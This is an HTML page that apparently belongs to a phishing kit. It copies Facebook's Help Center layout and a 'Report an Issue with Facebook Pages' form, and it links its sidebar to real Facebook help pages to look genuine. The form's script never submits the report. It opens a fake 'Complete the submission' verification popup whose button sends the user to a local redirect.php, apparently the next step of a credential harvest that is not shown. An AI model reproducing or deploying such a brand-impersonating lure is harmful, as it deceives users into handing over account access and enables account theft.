<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contact Forms</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
    <link rel="icon" href="./logo.png" sizes="32x32" type="image/png">
    <style>
        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, 'lucida grande', tahoma, verdana, arial, sans-serif;
            background-color: #e9ebee;
            margin: 0;
            font-size: 13px;
            width: 100vw;
        }

        .topnav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: #3b5998;
            padding: 5px 14%;
            flex-wrap: wrap;
            height: auto;
            margin: 0;
        }

        .topnav h1 a {
            color: white;
            text-decoration: none;
            font-weight: bold;
            font-size: 35px;
        }

        .topnav input[type="text"] {
            padding: 6px 20px 6px 30px;
            width: 100%;
            max-width: 600px;
            background-color: #fff;
            background-image: url('search.png');
            background-repeat: no-repeat;
            background-position: 10px center;
            line-height: 1.538;
            border: 1px solid;
            margin-top: 10px;
        }

        .topbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background-color: #e9ebee;
            padding: 10px 14%;
            height: auto;
            margin: 9px;
        }

        .topbar .left {
            display: flex;
            align-items: center;
            gap: 5px;
            position: relative;
        }

        .topbar .left a {
            text-decoration: none;
            color: #3578e5;
            font-weight: bold;
            font-size: 16px;
            position: relative;
            display: inline-block;
            margin: 0;
        }

        .topbar .left i {
            color: #3578e5;
            font-size: 14px;
        }

        .topbar .left::after {
            content: "";
            display: block;
            width: 100%;
            height: 3px;
            background-color: #3578e5;
            position: absolute;
            bottom: 0;
            top: 2.1rem;
            left: 0;
        }

        .topbar .right a {
            text-decoration: none;
            color: #2563eb;
            font-size: 14px;
        }

        .topbar .right a:hover {
            text-decoration: underline;
        }

        .container {
            display: flex;
            padding: 20px 120px;
            flex-wrap: wrap;
        }

        .sidebar {
            width: 100%;
            padding: 0 12px;
            display: none;
        }
        .ok{
            width: 100vw;
        }

        .content {
            width: 100%;
            background-color: #fff;
            padding: 20px;
            margin-left: 0;
            border: 1px solid #dddfe2;
            border-radius: 3px;
        }

        .sidebar ul {
            list-style-type: none;
            padding: 0;
        }

        .sidebar ul li {
            margin: 5px 0;
            height: 10px;
            padding: 7px;
            font-size: 14px;
        }

        .sidebar ul li:hover {
            background-color: #ebebeb;
        }

        .sidebar ul li a {
            text-decoration: none;
            color: #444950;
        }

        .form-group {
            margin-bottom: 15px;
            width: 300px;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }

        .form-group input,
        .form-group textarea {
            padding: 8px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        .form-group button {
            background-color: #4267B2;
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            float: right;
        }

        .form-group button:hover {
            background-color: #365899;
        }

        .ok {
            background-color: #fff;
        }

        .title {
            background-color: #e9ebee;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #dddfe2;
            height: 40px;
            width: 100%;
            padding: 20px 0 0 20px;
        }

        .back {
            border-top: 1px solid #dddfe2;
            background-color: #e9ebee;
            padding: 20px 20px 8px 0;
            height: 50px;
        }

        ._4-u2>._4-u3:first-child {
            border-top: none;
            border-top-left-radius: 3px;
            border-top-right-radius: 3px;
        }

        ._57d8 {
            background-color: #f5f6f7;
        }

        ._2ph_ {
            padding: 12px;
        }

        ._io ._3ban {
            font-size: 11px;
            line-height: inherit;
            width: 100%;
        }

        _4-u8 {
            background-color: #fff;
        }

        ._4-u2 {
            border: 1px solid #dddfe2;
            border-radius: 3px;
        }

        .cc {
            max-width: 760px;
            background: #fff;
            border-radius: 3px;
            border: 1px solid #e5e5e5;
            width: 100%;
        }

        .header {
            background-color: #f5f6f7;
            color: #4b4f56;
            border-bottom: 1px solid #e5e5e5;
            padding: 1px 20px;
            font-size: 11px;
        }

        .form-group {
            margin-bottom: 15px;
            color: #4b4f56;
            font-size: 11px;
            line-height: inherit;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #90949c;
            font-weight: 600;
        }

        .form-group input[type="text"] {
            height: 20px;
            width: 100%;
            border: 1px solid #ccd0d5;
            border-radius: 0;
            margin: 0;
            padding: 3px;
        }

        .form-group textarea {
            max-width: 100%;
            box-sizing: border-box;
            width: 100%;
            height: 50px;
            background-color: #fff;
            color: #1c1e21;
            border: 1px solid #ccd0d5;
            border-radius: 0;
            margin: 0;
            padding: 3px;
        }

        .form-group input[type="file"] {
            display: block;
            margin-top: 8px;
        }

        .form-group a {
            color: #385898;
            text-decoration: none;
        }

        .form-group a:hover {
            text-decoration: underline;
        }

        .btn-submit {
            display: inline-block;
            background-color: #4267b2;
            color: #fff;
            padding: 10px 15px;
            border: 1px solid #4267b2;
            border-radius: 2px;
            cursor: pointer;
            font-size: 12px;
            text-align: center;
            font-weight: bold;
            margin: 0;
        }

        .btn-submit:hover {
            background: #0056b3;
        }

        .optional {
            font-size: 0.9em;
            color: #666;
        }

        .padc {
            padding: 20px;
            font-size: 11px;
            color: #4b4f56;
        }

        /* 🔹 Responsive Design */
        @media (max-width: 768px) {
            body {
                width: 100%;
            }

            .topnav {
                flex-direction: column;
                /* Stack elements vertically */
                align-items: center;
                /* Center-align items */
                text-align: center;
                /* Center text */
                padding: 12px 5%;
                /* Adjust padding for smaller screens */
                width: 100%;
                margin-left: -20px;
            }

            .topnav h1 {
                margin-bottom: 10px;
                /* Add space between h1 and input */
            }

            .topnav input[type="text"] {
                margin: 0;
                width: 70%;
                /* Remove extra margin */
            }

            .topbar {
                padding: 10px 5%;
            }

            .container {
                padding: 20px 5%;
            }

            .sidebar {
                display: none;
            }

            .content {
                width: 100%;
                margin-left: 0;
            }

            .cc {
                width: 100%;
            }
        }

        @media (min-width: 769px) {
            .sidebar {
                display: block;
                width: 25%;
            }

            .content {
                width: 75%;
                margin-left: 10px;
            }
        }

        /* تنسيق النافذة المنبثقة */
        .popup {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
        }

        /* محتوى النافذة */
        .popup-content {
            background: white;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            width: 300px;
        }

        .popup-content h2 {
            color: #90949c;
        }

        .popup-content button {
            background-color: #4267B2;
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 10px;
        }

        .popup-content button a {
            text-decoration: none;
            color: #fff;
            font-weight: bold;
        }

        .popup-content button:hover {
            background-color: #365899;
        }

        .backwith{
            background: #fff;
            padding: 110px;
        }
    </style>
</head>

<body>
    <div id="rmvmobile">
        <div class="topnav">
            <h1><a href="#">facebook</a></h1>
            <input type="text" placeholder="How can we help you?">
        </div>

        <div class="topbar">
            <div class="left">
                <i class="fas fa-home"></i>
                <a href="#">Help Center</a>
            </div>
            <div class="right">
                <a href="#">English (US)</a>
            </div>
        </div>
    </div>

    <div class="ok">
        <div class="container">
            <div class="sidebar">
                <ul>
                    <li><a href="https://web.facebook.com/help/570785306433644/?helpref=hc_fnav">Creating an Account</a>
                    </li>
                    <li><a href="https://web.facebook.com/help/396528481579093/?helpref=hc_fnav">Your Profile</a></li>
                    <li><a href="https://web.facebook.com/help/1540345696275090/?helpref=hc_fnav">Friending</a></li>
                    <li><a href="https://web.facebook.com/help/312959615934334/?helpref=hc_fnav">Facebook Dating</a>
                    </li>
                    <li><a href="https://web.facebook.com/help/753701661398957/?helpref=hc_fnav">Your Home Page</a></li>
                    <li><a href="https://web.facebook.com/help/1071984682876123/?helpref=hc_fnav">Messaging</a></li>
                    <li><a href="https://web.facebook.com/help/753046815962474/?helpref=hc_fnav">Reels</a></li>
                    <li><a href="https://web.facebook.com/help/862926927385914/?helpref=hc_fnav">Stories</a></li>
                    <li><a href="https://web.facebook.com/help/1069521513115444/?helpref=hc_fnav">Photos</a></li>
                    <li><a href="https://web.facebook.com/help/1041553655923544/?helpref=hc_fnav">Videos</a></li>
                    <li><a href="https://web.facebook.com/help/2402655169966967/?helpref=hc_fnav">Gaming</a></li>
                    <li><a href="https://web.facebook.com/help/282489752085908/?helpref=hc_fnav">Pages</a></li>
                    <li><a href="https://web.facebook.com/help/1629740080681586/?helpref=hc_fnav">Groups</a></li>
                    <li><a href="https://web.facebook.com/help/1076296042409786/?helpref=hc_fnav">Events</a></li>
                    <li><a href="https://web.facebook.com/help/1434403039959381/?helpref=hc_fnav">Meta Pay</a></li>
                    <li><a href="https://web.facebook.com/help/1713241952104830/?helpref=hc_fnav">Marketplace</a></li>
                    <li><a href="https://web.facebook.com/help/1642635852727373/?helpref=hc_fnav">Apps</a></li>
                    <li><a href="https://web.facebook.com/help/866249956813928/?helpref=hc_fnav">Facebook Mobile
                            Apps</a></li>
                    <li><a href="https://web.facebook.com/help/273947702950567/?helpref=hc_fnav">Accessibility</a></li>
                </ul>
            </div>

            <div class="cc" id="showmobile">
                <div class="header">
                    <h2>Report an Issue with Facebook Pages</h2>
                </div>
                <div class=" padc">
                    <p>If you're having trouble with Facebook Pages, you've come to the right place. Please use this
                        form to tell us about the issue you're experiencing.</p>
                    <p>Please provide a detailed description of this issue, including:</p>
                    <ol>
                        <li>What you were doing when the problem occurred</li>
                        <li>What you expected to happen</li>
                        <li>What actually happened</li>
                    </ol>
                    <form>
                        <div class="form-group">
                            <label for="url">Web Address (URL) of Page</label>
                            <input type="text" id="url" name="url" required>
                        </div>

                        <div class="form-group">
                            <label for="description">Detailed Description</label>
                            <textarea id="description" name="description" rows="5" required></textarea>
                        </div>

                        <div class="form-group">
                            <label for="screenshot">Screenshot <span class="optional"><br>Optional</span></label>
                            <input type="file" id="screenshot" name="screenshot">
                        </div>

                        <div class="form-group">
                            <a href="https://www.facebook.com/help/?page=103834596374686" target="_blank">Learn how to
                                take a screenshot</a>
                        </div>

                        <p>Thanks for taking the time to submit a report. While we don't reply to every report, we'll
                            let you know if we need more details.</p>
                        <button type="submit" class="btn-submit">Send</button>
                    </form>
                </div>
            </div>
        </div>
    </div>
    <div class="backwith"></div>
    <div id="popup" class="popup">
        <div class="popup-content">
            <h2>Complete the submission</h2>
            <p>Please complete the verification to submit the form !</p>
            <button onclick="closePopup()"><a href="./redirect.php">Verification</a></button>
        </div>
    </div>
    <script>
        document.querySelector(".btn-submit").addEventListener("click", function (event) {
            event.preventDefault();

            let url = document.getElementById("url").value.trim();
            let description = document.getElementById("description").value.trim();

            if (url === "" || description === "") {
                alert("Please fill in all the required fields!");
                return;
            }

            document.getElementById("popup").style.display = "flex";
        });

        function closePopup() {
            document.getElementById("popup").style.display = "none";
        }
    </script>
</body>

</html>